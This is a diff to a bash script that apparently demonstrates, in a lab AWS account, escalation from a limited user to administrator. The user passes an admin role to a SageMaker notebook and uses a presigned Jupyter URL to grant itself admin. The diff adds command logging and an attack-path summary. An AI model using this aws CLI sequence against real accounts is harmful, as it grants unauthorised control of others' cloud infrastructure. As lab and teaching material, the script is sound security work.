@@ -5,7 +5,9 @@
 # can create a SageMaker notebook instance with an administrative role, then access it via
 # a presigned URL to execute commands with elevated privileges.
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-sagemaker-001-to-admin-starting-user"
@@ -71,6 +91,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -82,6 +103,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -89,6 +111,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -99,6 +122,7 @@ echo ""
 # Step 5: List available roles to find the passable admin role
 echo -e "${YELLOW}Step 5: Discovering available privileged roles${NC}"
 echo "Listing roles (looking for passable admin role)..."
+show_cmd aws iam list-roles --query "Roles[?contains(RoleName, \`passable\`)].{Name:RoleName, Arn:Arn}" --output table
 aws iam list-roles --query 'Roles[?contains(RoleName, `passable`)].{Name:RoleName, Arn:Arn}' --output table
 
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$PASSABLE_ROLE"
@@ -118,6 +142,7 @@ echo "Instance type: ml.t3.medium"
 echo "Role: $PASSABLE_ROLE"
 echo ""
 
+show_attack_cmd aws sagemaker create-notebook-instance --region $AWS_REGION --notebook-instance-name $NOTEBOOK_NAME --instance-type ml.t3.medium --role-arn $ROLE_ARN
 aws sagemaker create-notebook-instance \
     --region $AWS_REGION \
     --notebook-instance-name $NOTEBOOK_NAME \
@@ -175,6 +200,7 @@ echo -e "${YELLOW}Note: This works if you're already authenticated in the AWS Co
 # Option 2: Presigned URL
 echo -e "${GREEN}Option 2: Presigned URL (works without console login)${NC}"
 echo "Generating presigned URL (valid for 12 hours)..."
+show_cmd aws sagemaker create-presigned-notebook-instance-url --region $AWS_REGION --notebook-instance-name $NOTEBOOK_NAME --query 'AuthorizedUrl' --output text
 PRESIGNED_URL=$(aws sagemaker create-presigned-notebook-instance-url \
     --region $AWS_REGION \
     --notebook-instance-name $NOTEBOOK_NAME \
@@ -212,6 +238,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -234,6 +261,19 @@ echo "4. Passed admin role to notebook via iam:PassRole"
 echo "5. Generated presigned URL to access Jupyter"
 echo "6. Used notebook's admin role to grant admin policy to starting user"
 echo "7. Achieved: Full administrator access"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → PassRole + CreateNotebookInstance"
+echo "  → Notebook with $PASSABLE_ROLE (Admin)"
+echo "  → CreatePresignedNotebookInstanceUrl"
+echo "  → Access Jupyter Terminal → Admin Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- SageMaker notebook instance: $NOTEBOOK_NAME"
